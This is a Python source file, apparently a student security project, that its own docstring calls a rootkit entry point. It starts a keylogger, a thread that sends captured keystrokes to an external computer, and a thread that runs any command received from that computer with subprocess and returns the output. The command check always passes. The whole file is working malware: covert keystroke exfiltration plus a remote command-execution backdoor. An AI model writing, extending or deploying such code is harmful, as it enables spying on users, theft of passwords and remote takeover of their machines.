# /usr/bin/python3

import keylogger.model as kl
import network.network as net
import subprocess
import threading
import time

"""
The entry point to the rootkit will setup a series of covert channels for
collecting information from the user.  The first is a keylogger that will
begin to capture keys that are being hit, as well as a socket to receive
 data from an external computer.

This external computer will receive packets containing information captured
by the keylogger. The external computer can then send information to the
rootkit to execute particular commands and send the results back to the
calling computer.
"""

__author__ = "Nathaniel Cotton"
__email__ = "nec2887@rit.edu"


class KeyChecker(threading.Thread):
    __slots__ = ['keylogger']

    def __init__(self, keylogger):
        super().__init__()
        self.keylogger = keylogger

    def run(self):
        while True:
            if (self.keylogger.hasInfoToSend()):
                info = self.keylogger.getInfo()
                net.send(''.join(info))
            time.sleep(0)


class RecvChecker(threading.Thread):
    def __init__(self):
        super().__init__()

    def run(self):
        while True:
            command = net.recv()
            if (self.verifyCommand(command)):
                try:
                    sp = subprocess.getoutput(command)
                    net.send(sp)
                except Exception as e:
                    pass

    def verifyCommand(self, command):
        return True


def main():
    """
    Entry point into the application, that will setup the keylogger
    and the networking functionality.
    :return:
    """
    keylogger = kl.getKeyLogger()
    keylogger.start()
    keychecker = KeyChecker(keylogger)
    keychecker.start()
    recvChecker = RecvChecker()
    recvChecker.start()


if __name__ == '__main__':
    main()
